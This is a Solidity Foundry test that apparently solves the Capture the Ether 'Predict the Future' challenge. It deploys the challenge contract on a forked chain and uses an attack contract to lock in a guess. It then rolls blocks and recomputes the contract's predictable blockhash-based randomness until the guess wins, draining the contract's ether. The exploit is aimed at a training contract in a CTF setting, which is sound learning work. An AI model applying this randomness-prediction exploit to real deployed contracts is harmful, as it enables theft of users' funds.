// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import { PredictTheFutureChallenge } from "../../src/lotteries/PredictFuture.sol";
import { AttackPredictFuture } from "../../src/lotteries/AttackPredictFuture.sol";

contract PredictFutureTest is Test {
    PredictTheFutureChallenge predictFuture;
    AttackPredictFuture attack;
    string mainnetUrl = vm.envString("FORK_URL");
    uint256 mainnetFork;

    address h3x0r = vm.addr(1337);

    function setUp() public {
        mainnetFork = vm.createFork(mainnetUrl);
        vm.selectFork(mainnetFork);
        predictFuture = new PredictTheFutureChallenge();
        deal(h3x0r, 1 ether);
        deal(address(predictFuture), 1 ether);
    }


    function testPredictFutureExploit() public {
        vm.startPrank(h3x0r);
        
        attack = new AttackPredictFuture(
            address(predictFuture)
        );
        payable(address(attack)).transfer(1 ether);
        attack.lockInGuess(8);

        while (! predictFuture.isComplete()) {
            vm.roll(block.number + 2);

            uint8 answer = uint8(uint(keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp))
            )) % 10;
            emit log_uint(uint(answer));

            if (answer == 8) {
                attack.attack();
            }
        }
        
        
        assertEq(h3x0r.balance, 2 ether);
    }
}